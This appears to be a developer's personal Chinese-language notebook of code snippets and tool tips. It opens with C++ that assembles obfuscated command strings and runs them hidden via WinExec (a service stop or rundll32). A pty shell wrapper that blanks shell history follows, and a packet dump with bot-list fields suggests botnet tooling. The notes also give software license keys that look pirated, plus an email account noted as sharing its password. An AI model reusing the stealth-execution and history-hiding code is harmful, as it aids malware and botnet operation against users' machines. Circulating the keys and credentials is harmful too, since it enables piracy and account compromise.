	(DWORD&)tmp[0] += 0x1988793F; (DWORD&)tmp[0] += 0x06DBF424; (DWORD&)tmp[4] += 0x666EEDF7; (DWORD&)tmp[4] += 0x0BB17538;
	(DWORD&)tmp[8] += 0x6BC9F939; (DWORD&)tmp[8] += 0x009A753C; (DWORD&)tmp[12] += 0x191ED836; (DWORD&)tmp[12] += 0x07135B36;
	(DWORD&)tmp[16] += 0x45B165A7; (DWORD&)tmp[16] += 0x069ADB7E; (DWORD&)tmp[20] += 0x4ACD0685; (DWORD&)tmp[20] += 0x07784CD0;
	(DWORD&)tmp[24] += 0x3D6597C7; (DWORD&)tmp[24] += 0x11ECB88C; (DWORD&)tmp[28] += 0x40EC7E66; (DWORD&)tmp[28] += 0x045FCAE0;
	(DWORD&)tmp[32] += 0x60789F39; (DWORD&)tmp[32] += 0x08DEBCEC; (DWORD&)tmp[36] += 0x7219326A; (DWORD&)tmp[36] += 0x05563204;
	(DWORD&)tmp[40] += 0x56FF6FFF; (DWORD&)tmp[40] += 0x1853EC74; (DWORD&)tmp[44] += 0x2E6A21C6; (DWORD&)tmp[44] += 0x330D52A0;
	(DWORD&)tmp[48] += 0x67D3757A; (DWORD&)tmp[48] += 0x0170EFF8; (DWORD&)tmp[52] += 0x61CEAB83; (DWORD&)tmp[52] += 0x07A3C8F0;
	(DWORD&)tmp[56] += 0x57E6F1F4; (DWORD&)tmp[56] += 0x118D836E; (DWORD&)tmp[60] += 0x296C27E7; (DWORD&)tmp[60] += 0x28F04688;
	(DWORD&)tmp[64] += 0x610BFD57; (DWORD&)tmp[64] += 0x1163730E; (DWORD&)tmp[68] += 0x55AF4230; (DWORD&)tmp[68] += 0x11BF2744;
	(DWORD&)tmp[72] += 0x609B90EB; (DWORD&)tmp[72] += 0x0DC9E55A; (DWORD&)tmp[76] += 0x5E276B30; (DWORD&)tmp[76] += 0x06070844;
	(DWORD&)tmp[80] += 0x66D529A0; (DWORD&)tmp[80] += 0x076FF6C2; (DWORD&)tmp[84] += 0x796B6052; (DWORD&)tmp[84] += 0x00070522;
	(DWORD&)tmp[88] += 0xD432DF56; (DWORD&)tmp[88] += 0x2BCD20AA;

	char tmp2[8] = { 0 }; //net stop WlanSvr
	(DWORD&)tmp2[0] += 0x18D80323; (DWORD&)tmp2[0] += 0x079C624B; (DWORD&)tmp2[4] += 0x5AE1655B; (DWORD&)tmp2[4] += 0x158E0F18;
	(DWORD&)tmp2[8] += 0x5F77F926; (DWORD&)tmp2[8] += 0x01F45DFA; (DWORD&)tmp2[12] += 0x70015EF8; (DWORD&)tmp2[12] += 0x0274F476;
	(DWORD&)tmp2[16] += 0xFF1AC936; (DWORD&)tmp2[16] += 0x00E536CA;

	if (mainIsAdministratorUser()) {
		OutputDebugStringW(L"start server");
		WinExec(tmp2, SW_HIDE);
	}
	else {
		OutputDebugStringW(L"rundll32");
		WinExec(tmp, SW_HIDE);
	}

```

### 隐藏窗口

```
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口
#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR")//减小编译体积

```

### dll to lib

```
lib /machine:x64 /def:sqlite3.def
```

### kali密码

```
kali
kali
```

### ssh免密登录

```
本地客户端生成公私钥：（一路回车默认即可）
> ssh-keygen
把id_rsa.pub的内容写入到服务器用户或root目录下的.ssh目录的authorized_keys
cd ~/.ssh
vim authorized_keys
```

### win10自带端口转发

```
netsh interface portproxy add v4tov4 listenport=4444 connectaddress=192.168.8.134 connectport=4444

cmd
netsh interface portproxy reset
```

### windows内核调试

```

$$>a<E:\yu\Desktop\Tools\myAttachProc.wds 0n+Pid
```

### 在公网接收数据有问题。原因是recv 的时候len，会被分段。还要加一个记录实际的已经接收的长度。

```
	int n = 0;
	size_t sum = 0;
	char* offset = buf;
	unsigned int recvLen = len; //修改这里
	while (sum < len) {
		if (len <= 0 || len > MAXBUF) {
			return TCP_ERROR;
		}
		n = recv(client, offset, recvLen, 0);
		printf("recvall n:%d \n", n);
		if (n < 0 || n > MAXBUF) {
			return TCP_ERROR;
		}
		if (n == 0) {
			return TCP_ERROR;
		}

		if (n < 0) {
			return TCP_ERROR;
		}
		recvLen -= n; //修改这里
		sum += n;

		offset += n;
	}
```

### 无法从“const char”转换为“char *

```
项目属性  C++   语言   把符合模式改为 否 
```

### 010 Editor 激活码

```
Username：Brucy
Serial：218o1A9CEA2E5227
```

### cmd 查sha1值

```
windows ：
	certutil -hashfile filename
linux :
	sha1sum filename
```

### eset 激活码

```
K6EC-X5BA-HUH3-N4AS-CURJ
```

### 提取.lib静态库中的obj文件

#### lib /list ldrv.lib  获取obj名称

```
C:\Users\admin\Desktop>lib /list ldrv.lib
Microsoft (R) Library Manager Version 14.29.30148.0
Copyright (C) Microsoft Corporation.  All rights reserved.

..\iTEMP\ldrvWin32Release\instdrv.obj
..\iTEMP\ldrvWin32Release\loaderdrv.obj
..\iTEMP\ldrvWin32Release\mem.obj
..\iTEMP\ldrvWin32Release\readwrt.ob
```

#### link -lib /extract:..\iTEMP\ldrvWin32Release\loaderdrv.obj ldrv.lib    导出obj在当前路径

```
C:\Users\admin\Desktop>link -lib /extract:..\iTEMP\ldrvWin32Release\loaderdrv.obj ldrv.lib
Microsoft (R) Library Manager Version 14.29.30148.0
Copyright (C) Microsoft Corporation.  All rights reserved.
```

### vs修改输出文件名

```
#pragma comment(linker,"/OUT:\"../bin/MarsSnake64.dll\"")
属性 > 连接器 > 常规 > 把输出文件选项的内容删除。
```

### 文件下载时，打开方式rb。 如果是rb+ 则有部分文件读取失败（rb+ 已可读写的权限）



### sudo环境变量错误

```
$sudo visudo
在Defaults        secure_path  追加需要的环境变量。
ctrl+O  回车  保存    ctrl+x 退出。
```

### go vscode 用root调试

```
// .vscode/launch.json
{
    // Use IntelliSense to learn about possible attributes.
    // Hover to view descriptions of existing attributes.
    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387
    "version": "0.2.0",
    "go.goroot": "/usr/local/go",
    "configurations": [
      {
        "name": "Launch",
        "type": "go",
        "request": "launch",
        "mode": "auto",
        "program": "${fileDirname}",
        "env": {},
        "args": ["-d"],
        
        // 用root用户调试，两个一起用
        "console": "integratedTerminal",
        "asRoot": true,
        
        
        "dlvFlags": ["--check-go-version=false"]
      }
      
    ]
    
}
```

### 打印buf  16进制  + 字节

```
#define DEBUG_BUF_SIZE 512
void my_print_buf(const unsigned char *buf, size_t len )
{
    char str[DEBUG_BUF_SIZE];
    char txt[17];
    size_t i, idx = 0;

    snprintf( str + idx, sizeof( str ) - idx, "dumping (%u bytes)\n", (unsigned int) len );
    printf("%s", str);
    idx = 0;
    memset( txt, 0, sizeof( txt ) );
    for( i = 0; i < len; i++ )
    {
        if( i >= 4096 )
            break;

        if( i % 16 == 0 )
        {
            if( i > 0 )
            {
                snprintf( str + idx, sizeof( str ) - idx, "  %s\n", txt );
                printf("%s", str );

                idx = 0;
                memset( txt, 0, sizeof( txt ) );
            }

            idx += snprintf( str + idx, sizeof( str ) - idx, "0x%04x: ",
                             (unsigned int) i );

        }

        idx += snprintf( str + idx, sizeof( str ) - idx, " %02x",
                         (unsigned int) buf[i] );
        txt[i % 16] = ( buf[i] > 31 && buf[i] < 127 ) ? buf[i] : '.' ;
    }

    if( len > 0 )
    {
        for( /* i = i */; i % 16 != 0; i++ )
            idx += snprintf( str + idx, sizeof( str ) - idx, "   " );
        snprintf( str + idx, sizeof( str ) - idx, "  %s\n", txt );
        printf( "%s", str );
    }
}


0000:  00 00 00 c6 5e 7f 03 01 01 07 50 41 43 4b 41 47  ....^.....PACKAG
0010:  45 01 ff 80 00 01 06 01 04 54 79 70 65 01 06 00  E........Type...
0020:  01 08 42 6f 74 43 6f 75 6e 74 01 06 00 01 07 42  ..BotCount.....B
0030:  6f 74 4c 69 73 74 01 ff 82 00 01 0b 50 61 72 61  otList......Para
0040:  6d 4c 65 6e 67 74 68 01 06 00 01 05 50 61 72 61  mLength.....Para
0050:  6d 01 ff 84 00 01 07 43 6f 6e 74 65 6e 74 01 0a  m......Content..
0060:  00 00 00 16 ff 81 02 01 01 08 5b 5d 73 74 72 69  ..........[]stri
```



### 封装 linux 交互式终端，键盘输入回显

```
#include <sys/ioctl.h>
#include <sys/select.h>

#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>


#include <termios.h>


#define BUFSIZE     4096

#define ERROR       1

#define HOMEDIR		"/root"

#define true 1
#define false 0

#define PEL_SUCCESS     1
#define PEL_ERROR       0


typedef struct bashPtyInfo_
{
    struct winsize ws;
    size_t  block_size;
    pthread_t   read_pty_pid;
    char    term[64];
    char    bash_name[64];

}bashPtyInfo;

typedef void *(*read_pty)(unsigned char* data, unsigned int len);
typedef void *(*write_pty)(unsigned char* data, unsigned int len);


typedef struct pthreadPtyParam_
{
    int pty;
    int block_size;
    read_pty    read_cb;
}pthreadPtyParam;

int readPtyMessage(pthreadPtyParam* Parm) {
	fd_set rd;
    int n = 0, pty = Parm->pty, len = 0;
    char *buffer = (char*)malloc(Parm->block_size);

    while (1) {
        bzero(buffer, Parm->block_size);
        FD_ZERO(&rd);
        // FD_SET(client, &rd);
        FD_SET(pty, &rd);
        n = pty;
        if (select(n + 1, &rd, NULL, NULL, NULL) < 0){ // 阻塞等待数据
            perror("select");
            break;
        }
        if (FD_ISSET(pty, &rd)) { // 为true表示终端有数据(如bash指令结果)可读
            len = read(pty, buffer, Parm->block_size);

            if (len == 0)
                break;
            if (len < 0){
                // perror("err: ");
                break;
            }
            Parm->read_cb(buffer, len);
        }
    }
    Parm->read_cb("end", 3);
    close(pty);
}

// int runshell(bashPtyInfo* ptyInfo, read_pty read_cb, write_pty write_cb)
int runshell(bashPtyInfo* ptyInfo, read_pty read_cb)
{
	fd_set rd;
	struct winsize ws;
	char *slave, *temp, *shell;
	int ret, len, pid, pty, tty, n;
	char buf[BUFSIZE + 1] = {0};//zys 20230215
	int status;

    bashPtyInfo myPtyInfo  = {0};
    memcpy(&myPtyInfo, ptyInfo, sizeof(bashPtyInfo));

	if (openpty(&pty, &tty, NULL, NULL, NULL) < 0) // 找到一个可用的伪终端, 将主句柄和从句柄分别赋予pty(pseudo, 伪终端)和tty(teletypes, 终端)
		return (ERROR);

	slave = ttyname(tty);

	if (slave == NULL)
		return (ERROR);

	chdir(HOMEDIR);
	putenv("HISTFILE=");

	setenv("TERM", (char *)myPtyInfo.term, 1);


	if (ioctl(pty, TIOCSWINSZ, &myPtyInfo.ws) < 0) // 设置终端窗口大小(tioc set window size)
		return (ERROR);



    temp = (char *)malloc(20 + strlen(myPtyInfo.bash_name));
    if (temp == NULL)
        return (ERROR);
    strcpy(temp, "exec ");
    strcpy(temp, myPtyInfo.bash_name);


	pid = fork();

	if (pid < 0) {
		free(temp);
		return (ERROR);
	}

	if (pid == 0) { // 子进程: 
		// close(g_sockfd);
		close(pty);

		if (setsid() < 0) {
			free(temp);
			return (ERROR);
		}

		if (ioctl(tty, TIOCSCTTY, NULL) < 0) { // 将tty作为本进程的控制终端
			free(temp);
			return (ERROR);
		}

		dup2(tty, 0); // 复制tty到文件描述符0(stdin)
		dup2(tty, 1); // 复制tty到文件描述符1(stdout)
		dup2(tty, 2); // 复制tty到文件描述符2(stderr)

		if (tty > 2)
			close(tty);

		shell = (char *)malloc(64);

		if (shell == NULL) {
			free(temp);
			return (ERROR);
		}

		// strcpy(shell, "/bin/bash");
		strcpy(shell, myPtyInfo.bash_name);

		execl(shell, shell + 5, "-c", temp, (char *)0); // 转到新进程, 执行bash命令
		free(temp);
		free(shell);

		return 0;
	} else { // 以下是主进程的操作
		close(tty);

        pthreadPtyParam *p_parm = (pthreadPtyParam*)malloc(sizeof(pthreadPtyParam));
        p_parm->block_size = myPtyInfo.block_size;
        p_parm->pty = pty;
        p_parm->read_cb = read_cb;
		pthread_create(&ptyInfo->read_pty_pid, NULL, readPtyMessage, p_parm); //创建一个线程去接受指令，写入mq消息队列

		return pty;
	}
}




void read_message(unsigned char* data, unsigned int len) {
    printf("%s", data);
    fflush(stdout);
}


int main(int argc, char const *argv[])
{
    printf("wait...\n");
    bashPtyInfo ptyInfo = {0};
    char* bash = getenv("SHELL");
    
    if (strlen(bash) > 0)
        strcat(ptyInfo.bash_name, bash);
    else
    {
        strcat(ptyInfo.bash_name, "/bin/sh");
    }
    
    strcat(ptyInfo.term, "vt100");
    ptyInfo.block_size = 4096;


    ioctl(STDIN_FILENO, TIOCGWINSZ, &ptyInfo.ws);

    int pty = runshell(&ptyInfo, read_message);
	


	struct termios tp, tr;
	if (isatty(1)) { // stdout是终端
		if (tcgetattr(1, &tp) < 0) { // 获取终端的stdout的参数
			return 1;
		}

		memcpy((void *)&tr, (void *)&tp, sizeof(tr));

		tr.c_iflag |= IGNPAR;
		tr.c_iflag &=
		    ~(ISTRIP | INLCR | IGNCR | ICRNL | IXON | IXANY | IXOFF);
		tr.c_lflag &=
		    ~(ISIG | ICANON | ECHO | ECHOE | ECHOK | ECHONL | IEXTEN);
		tr.c_oflag &= ~OPOST;

		tr.c_cc[VMIN] = 1;
		tr.c_cc[VTIME] = 0;

		if (tcsetattr(1, TCSADRAIN, &tr) < 0) { // 允许排空(drain)stdout的缓冲区, 并设置串口参数
			return 1;
		}
        
	}

    char buffer[4096] = {0};
    fd_set rd;
    int len, res;
    while (1) {
		bzero(buffer, 4096);

        FD_ZERO(&rd);
		FD_SET(0, &rd); 

		if (select(0 + 1, &rd, NULL, NULL, NULL) < 0) { // 同时监听终端程序的标准输入以及界面程序写入的管道
			break;
		}
		if (FD_ISSET(0, &rd)) { // 终端有按键输入
            if ((len = read(0, buffer, BUFSIZE)) < 0) {
                break;
            }
            if (len == 0) {
                fprintf(stderr, "stdin: end-of-file\n");
                break;
            }

            res = write(pty, buffer, strlen(buffer)); // 写入管道, 让界面程序读取
            if (res == -1) {
                fprintf(stderr, "Write error on pipe\n");
                exit(EXIT_FAILURE);
            }
		}
    }
    tcsetattr(STDIN_FILENO, TCSAFLUSH, &tp); // 恢复终端正常输入

    return 0;
}

```

mojie jugpoj@bougc.com  密码一样

### test

```

#include <termios.h>
#include <stddef.h>
#include <sys/select.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <pthread.h>

typedef struct bashInfo_
{
    struct winsize  ws;
    char            bash_name[32];
    char            tty_name[32]
}bashInfo;

typedef struct threadInfo_
{
	int			pty;
	send_msg	send_cb;
}threadInfo;


#define ERROR       0
#define SOCK_ERROR  ERROR


#define REAL_BUFSIZE	4096

typedef void*(*send_msg)(char* buf, int len);



void readPty(threadInfo* thread_info) {
	fd_set rd;
	int pty = thread_info->pty;
	int len;
	char buf[REAL_BUFSIZE] = {0};
	while (1) {
		FD_ZERO(&rd);
		
		FD_SET(pty, &rd);
		if (select(pty + 1, &rd, NULL, NULL, NULL) < 0){
			perror("select");
			goto FAIL; 
		}
		if (FD_ISSET(pty, &rd)) { 
			len = read(pty, buf, REAL_BUFSIZE);

			if (len == 0)
				break;
			if (len < 0){
				break;
			}
			
			thread_info->send_cb(buf, len);
		}
	}
FAIL:
	thread_info->send_cb("end", 0);
}

int runshell(bashInfo* bash_info, send_msg* send_cb)
{
	fd_set rd;
	struct winsize ws;
	char *slave, *temp, *shell, *rcfile;
	int ret, len, pid, pty, tty, n;
	char buf[REAL_BUFSIZE + 1] = {0};

	int status;

	if (openpty(&pty, &tty, NULL, NULL, NULL) < 0) // 找到一个可用的伪终端, 将主句柄和从句柄分别赋予pty(pseudo, 伪终端)和tty(teletypes, 终端)
		return (ERROR);

	slave = ttyname(tty);

	if (slave == NULL)
		return (ERROR);

	chdir("/root");
	putenv("HISTFILE=");

	buf[len] = '\0';
	setenv("TERM", bash_info->bash_name, 1);



	if (ioctl(pty, TIOCSWINSZ, bash_info->ws) < 0) // 设置终端窗口大小(tioc set window size)
		return (ERROR);


	temp = (char *)malloc(20);
	if (temp == NULL)
		return (ERROR);
	strcpy(temp, "exec bash ");


	pid = fork();

	if (pid < 0) {
		free(temp);
		return (ERROR);
	}

	if (pid == 0) { // 子进程: 
		// close(g_sockfd);
		close(pty);

		if (setsid() < 0) {
			free(temp);
			return (ERROR);
		}

		if (ioctl(tty, TIOCSCTTY, NULL) < 0) { // 将tty作为本进程的控制终端
			free(temp);
			return (ERROR);
		}

		dup2(tty, 0); // 复制tty到文件描述符0(stdin)
		dup2(tty, 1); // 复制tty到文件描述符1(stdout)
		dup2(tty, 2); // 复制tty到文件描述符2(stderr)

		if (tty > 2)
			close(tty);

		shell = (char *)malloc(10);

		if (shell == NULL) {
			free(temp);
			return (ERROR);
		}

		strcpy(shell, bash_info->bash_name);

		execl(shell, shell + 5, "-c", temp, (char *)0); // 转到新进程, 执行bash命令
		free(temp);
		free(shell);

		return 0;
	} else { // 以下是主进程的操作
		int pid;

		threadInfo* thread_info = (threadInfo*)malloc(sizeof(threadInfo));
		thread_info->pty = pty;
		thread_info->send_cb = send_cb;
		pthread_create(&pid, NULL, readPty, thread_info); //创建一个线程去接受指令，写入mq消息队列

	}	

	return pty;

}

void read_pty(char* buf, int len)
{
	printf("%s", buf);
	fflush(stdout);
}


int main(int argc, char const *argv[])
{
    /* code */
    return 0;
}

```

### chrome 浏览器自定义数据储存

```
图标加上 chrome.exe --enable-ipv6 --user-data-dir="E:\yu\chrome\User Data" --disk-cache-dir="E:\yu\chrome\User Data" --disk-cache-size=1048576000
```

### 搭建本地ubuntu镜像源

* * sudo apt install apt-mirror

  * sudo vi /etc/apt/mirror.list

    ```
    ############# config ##################
    #下载位置 默认为：/var/spool/apt-mirror/
    set base_path    /home/XXXXX/XXX
    #
    #set mirror_path  $base_path/mirror
    #set skel_path    $base_path/skel
    #set var_path     $base_path/var
    #set cleanscript $var_path/clean.sh
    #set defaultarch  <running host architecture>
    #set postmirror_script $var_path/postmirror.sh
    #set run_postmirror 0
    set nthreads     20
    set _tilde 0
    #
    ############# end config ##############
    deb [arch=amd64] http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse
    deb [arch=amd64] http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse
    deb [arch=amd64] http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse
    deb [arch=amd64] http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse
    deb [arch=amd64] http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse
    
    # 下载完成后清除部分空间
    clean https://mirrors.aliyun.com/ubuntu
    
    ```

  * ubuntu 2204 代号:jammy 大小：335.7GB

  * ubuntu 2004 代号:focal  大小：440.8GB

  * ubuntu 1804 代号:bionic 大小：296.2GB

  * ubuntu 1604 代号:xenial 大小：115.5GB

  
#### apt-mirror 2017停止更新

​	需要手动下载icons

  ```
cd /data/ubuntu/mirror/mirrors.aliyun.com/ubuntu/dists/
  dists="*"
for dist in ${dists}; do
    for comp in main  multiverse universe; do
    for size in 48 64 128; do
      wget http://archive.ubuntu.com/ubuntu/dists/${dist}/${comp}/dep11/icons-${size}x${size}@2.tar.gz -O ${dist}/${comp}/dep11/icons-${size}x${size}@2.tar.gz;
     done
   done
  done
  
  ```

  

  #### 搭建访问

  * sudo apt install apache2
  * ln –s /home/xxx/xxx/mirror/mirrors.aliyun.com/Ubuntu /var/www/html/Ubuntu

  #### 需要访问的用户

  * 修改镜像源
  
    ```
    deb http://127.0.0.1/ubuntu/ bionic main restricted universe multiverse
    deb http://127.0.0.1/ubuntu/ bionic-updates main restricted universe multiverse
    deb http://127.0.0.1/ubuntu/ bionic-security main restricted universe multiverse
    deb http://127.0.0.1/ubuntu/ bionic-backports main restricted universe multiverse
    deb http://127.0.0.1/ubuntu/ bionic-proposed main restricted universe multiverse
    ```
    
    


```
{
	"insecure-registries": ["http://192.168.105.235:5000"]
	}
```



### docker latest失败的镜像

```
adminer library2:latest
aerospike:latest
bash:latest
cassandra:latest
cirros:latest
consul:latest
couchdb:latest
docker:latest
drupal:latest
elasticsearch:latest
elixir:latest
fluentd:latest
gcc:latest
ghost:latest
haproxy:latest
hello-world:latest
httpd:latest
hylang:latest
ibm-semeru-runtimes:latest
irssi:latest
julia:latest
kibana:latest
logstash:latest
mariadb:latest
memcached:latest
mongo:latest
mysql:latest
neo4j:latest
nginx:latest
notary:latest
oraclelinux:latest
perl:latest
postgres:latest
pypy:latest
rabbitmq:latest
redis:latest
redmine:latest
ruby:latest
rust:latest
sapmachine:latest
solr:latest
sonarqube:latest
storm:latest
swipl:latest
tomee:latest
ubuntu:latest
unit:latest
varnish:latest
vault:latest
websphere-liberty:latest
wordpress:latest
xwiki:latest
```

#### office docker

```
mongo-express
traefik
backdrop
consul
chronograf
influxdb
kapacitor
telegraf
hello-seattle
hola-mundo
fsharp
spiped
vault
clearlinux
eggdrop
ibmjava
openjdk
kong
zookeeper
nats-streaming
storm
plone
bash
amazonlinux
composer
known
eclipse-mosquitto
nextcloud
silverpeas
swift
haxe
rapidoid
adminer
geonetwork
xwiki
groovy
znc
gradle
convertigo
flink
swipl
rust
mediawiki
euleros
sl
open-liberty
clefos
teamspeak
matomo
yourls
alt
amazoncorretto
express-gateway
postfixadmin
fluentd
adoptopenjdk
sapmachine
varnish
jobber
archlinux
friendica
caddy
monica
phpmyadmin
hitch
almalinux
dart
eclipse-temurin
ibm-semeru-runtimes
rockylinux
api-firewall
emqx
satosa
unit
spark
centos
busybox
ubuntu
fedora
registry
hipache
docker-dev
debian
cirros
crux
ubuntu-upstart
buildpack-deps
nginx
node
mysql
wordpress
postgres
redis
java
mongo
rails
ruby
python
ubuntu-debootstrap
perl
hello-world
hylang
gcc
jenkins
golang
neurodebian
clojure
php
jruby
mageia
crate
php-zendserver
tomcat
mono
haskell
glassfish
maven
httpd
sentry
r-base
mariadb
thrift
pypy
django
haproxy
memcached
rabbitmq
oraclelinux
odoo
rethinkdb
iojs
websphere-liberty
irssi
swarm
elasticsearch
jetty
ghost
celery
percona
aerospike
logstash
julia
alpine
rakudo-star
drupal
cassandra
sonarqube
couchbase
ros
kibana
kaazing-gateway
arangodb
owncloud
gazebo
joomla
redmine
nats
rocket.chat
docker
tomee
sourcemage
bonita
solr
neo4j
erlang
nuxeo
photon
couchdb
notary
piwik
elixir
lightstreamer
orientdb
```

### 根据名字kill 进程

```shell
 ( ps aux | grep "proccess_name" | grep -v 'grep' | awk '{print $2}' ) | xargs kill -9
 
 #查找涉及某端口的进程可以用这条命令(以80端口为例): 
 netstat -A | grep -E "(\.((2(5[0-5]|[0-4][0-9]))|[0-1]?[0-9]{1,2})){3}\.80" | awk '{print $1}' > tmpfile; fstat | grep -f tmpfile; rm tmpfile
```

### 回调函数

```c
typedef void *(*read_message)(unsigned char* data, unsigned int len, void* args);
```

### vmware进入boot

```
虚拟机目录  在.vmx  最上面加
bios.forceSetupOnce = "TRUE"
```

